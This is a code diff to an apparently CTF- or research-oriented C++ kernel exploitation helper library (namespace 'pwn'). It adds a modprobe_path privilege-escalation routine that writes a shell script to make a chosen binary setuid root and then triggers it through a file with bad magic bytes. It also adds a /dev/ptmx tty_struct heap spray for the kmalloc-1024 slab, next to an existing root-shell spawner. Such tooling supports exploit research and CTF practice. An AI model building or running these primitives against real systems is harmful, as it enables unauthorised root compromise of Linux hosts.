@@ -10,6 +10,12 @@
 #include <sys/ipc.h>
 #include <sys/shm.h>
 
+// tty_struct
+// open
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
 namespace pwn
 {
 
@@ -18,6 +24,56 @@ namespace pwn
         char *argv[] = {(char *)"/bin/sh", NULL};
         char *envp[] = {NULL};
         execve("/bin/sh", argv, envp);
+    }
+
+    namespace modprobe_path
+    {
+        void init(std::string modprobe_path, std::string dummy_file, std::string win_bin)
+        {
+            // todo: check if these path are all absolute path
+
+            int fd = open(dummy_file.c_str(), O_RDWR | O_CREAT);
+            if (fd < 0)
+            {
+                perror("[*] dummy_file creation failed");
+                exit(-1);
+            }
+
+            char bad_magic[] = "\xff\xff\xff\xff";
+            write(fd, bad_magic, sizeof(bad_magic) - 1); // remove null terminator
+            close(fd);
+
+            std::string w = "#!/bin/sh\nchmod 4755 " + win_bin + " && chown root:root " + win_bin + " && chmod u+s " + win_bin + "\n";
+
+            if (chmod(dummy_file.c_str(), 0777) < 0)
+            {
+                logger::error("Failed to chmod dummy_file");
+                exit(-1);
+            };
+
+            fd = open(modprobe_path.c_str(), O_RDWR | O_CREAT);
+            if (fd < 0)
+            {
+                logger::error("modprobe_path creation failed");
+            }
+
+            write(fd, w.c_str(), w.size() + 1);
+            close(fd);
+
+            if (chmod(modprobe_path.c_str(), 0777) < 0)
+            {
+                logger::error("Failed to chmod modprobe_path");
+            };
+        }
+
+        void trigger(std::string dummy_file, std::string win_bin)
+        {
+            logger::info("Triggering modprobe_path");
+            system(dummy_file.c_str());
+
+            logger::info("Triggering win");
+            system(win_bin.c_str());
+        }
     }
 
     namespace msg_msg
@@ -93,6 +149,32 @@ namespace pwn
                         exit(-1);
                     }
                 }
+            }
+        }
+    }
+
+    namespace kmalloc_1024
+    {
+        namespace tty_struct
+        {
+            std::vector<int> spray(size_t num_of_spray)
+            {
+                std::vector<int> sprays;
+                for (int i = 0; i < num_of_spray; i++)
+                {
+                    int cur_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+                    if (cur_fd == -1)
+                    {
+                        perror("tty_struct ptmx error");
+                        exit(-1);
+                    }
+                    else
+                    {
+                        sprays.push_back(cur_fd);
+                    }
+                }
+
+                return sprays;
             }
         }
     }
